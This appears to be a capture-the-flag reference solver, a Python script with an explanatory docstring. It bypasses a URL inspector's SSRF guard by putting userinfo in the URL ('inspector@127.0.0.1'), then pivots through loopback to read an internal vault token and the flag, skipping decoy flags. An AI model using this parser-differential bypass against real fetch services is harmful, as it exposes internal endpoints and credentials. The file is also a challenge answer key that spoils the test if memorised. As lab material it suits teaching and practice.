#!/usr/bin/env python3
"""
ZSCTF :: Palisade -- reference solver.

Intended path (exploits only the parse differential that is in plain sight in
challenge/app.py):

  1. Palisade is a fetch-on-your-behalf URL inspector. Its SSRF guard blocks
     every bare internal/loopback host (127.0.0.1, localhost, 0.0.0.0, decimal
     IPs, ::1, the rest of 127/8, ...): they all parse or resolve to an internal
     address and are refused.

  2. But the GUARD and the FETCHER parse the URL authority differently:
       - the guard keeps userinfo, so for  http://anything@127.0.0.1:IPORT/...
         its "host" is the string  anything@127.0.0.1 , which is not an IP and
         does not resolve -> the guard's flawed rule ("unresolvable == safe")
         ALLOWS it.
       - the fetcher uses urlsplit(), whose RFC-3986 parse strips the userinfo
         and connects to the real host 127.0.0.1 -> loopback inside the
         container, where the INTERNAL results service listens on its own
         unpublished ephemeral port IPORT (reported by /whoami).

  3. Every fetch the inspector makes carries the internal edge credential, so
     the fetched internal request is trusted. We ride it:
       hop 1: reach /internal/  -> learn the per-instance vault token
       hop 2: reach /internal/vault/<token>  -> read the flag

The internal service is bound to 127.0.0.1 and is never published, and egress is
blocked in deployment, so this loopback pivot is the only way in: /internal is
not on the public port (a leaked edge credential does not help), and you cannot
exfiltrate the credential to an outside server you control.

Usage:
    python solve.py --url http://HOST:PORT
"""
import sys
import re
import json
import argparse
from urllib.parse import urlsplit, urlencode
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError

# The PUBLISHED strict flag format. The internal service hosts decoys (a
# "staging cache" fixture flag, and inert /debug + /backup endpoints) whose
# flag-shaped strings all fail this rule; we accept ONLY a flag that matches it.
STRICT_FLAG = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")


def _get_json(url, timeout=20):
    req = Request(url, headers={"Accept": "application/json"})
    try:
        with urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read().decode("utf-8", "replace"))
    except HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode("utf-8", "replace"))
        except Exception:
            return e.code, {}


def inspect(base, inner_url, timeout=20):
    """Ask the inspector to fetch inner_url; return its JSON result."""
    q = urlencode({"url": inner_url})
    _, j = _get_json(base.rstrip("/") + "/inspect?" + q, timeout=timeout)
    return j


def solve(base):
    # Learn the instance's internal loopback port (the pivot target). /whoami
    # advertises it; it is loopback-only and never published, so it is not a
    # secret and knowing it does not make /internal reachable off the pivot.
    _, who = _get_json(base.rstrip("/") + "/whoami")
    internal_port = who.get("internal_port") or (urlsplit(base).port or 80)

    # The parse-differential payload: userinfo keeps the guard happy ("can't
    # resolve anything@127.0.0.1"), while urlsplit() connects to 127.0.0.1 --
    # loopback inside the container, where the internal service listens.
    def payload(path):
        return "http://inspector@127.0.0.1:%d%s" % (internal_port, path)

    # hop 1: internal index -> vault token(s)
    r1 = inspect(base, payload("/internal/"))
    if not r1.get("ok"):
        raise SystemExit("[-] hop 1 blocked by guard: %s" % r1.get("reason"))
    body1 = r1.get("body", "")
    tokens = list(dict.fromkeys(re.findall(r"vault/([0-9a-f]{8,})", body1)))  # dedup, keep order
    if not tokens:
        raise SystemExit("[-] could not find any vault token in internal index:\n" + body1[:400])
    print("[+] reached internal index via loopback pivot; vault candidate(s) = %s" % tokens)

    # hop 2: the index lists MORE THAN ONE vault path -- a "staging cache" decoy
    # (listed first, to bait a grab-the-first-hit solver) and the real flag
    # vault. We do NOT trust the ordering or the label: we read each candidate
    # and accept ONLY the one whose FLAG satisfies the published strict format
    # rule. The staging fixture is UPPERCASE+hyphens and is rejected by it.
    # (verify-before-commit: this is exactly the escape a careful human makes.)
    for tok in tokens:
        r2 = inspect(base, payload("/internal/vault/%s" % tok))
        if not r2.get("ok"):
            print("[-] vault %s unreachable: %s" % (tok, r2.get("reason")))
            continue
        body2 = r2.get("body", "")
        cand = re.search(r"(zerosecurectf\{[^}]*\})", body2, re.IGNORECASE)
        if not cand:
            continue
        val = cand.group(1)
        if STRICT_FLAG.match(val):
            print("[+] vault %s -> %s  (passes strict format: ACCEPTED)" % (tok, val))
            return val
        print("[-] vault %s -> %s  (fails strict format rule: decoy, REJECTED)" % (tok, val))
    raise SystemExit("[-] no vault returned a format-valid flag (only decoys found)")


def main():
    ap = argparse.ArgumentParser(description="Palisade reference solver (SSRF parse differential).")
    ap.add_argument("--url", required=True, metavar="http://HOST:PORT",
                    help="base URL of the running Palisade app")
    args = ap.parse_args()
    try:
        flag = solve(args.url)
    except (URLError, OSError) as e:
        print("[-] network error talking to %s: %s" % (args.url, e))
        return 1
    print("[+] FLAG =", flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
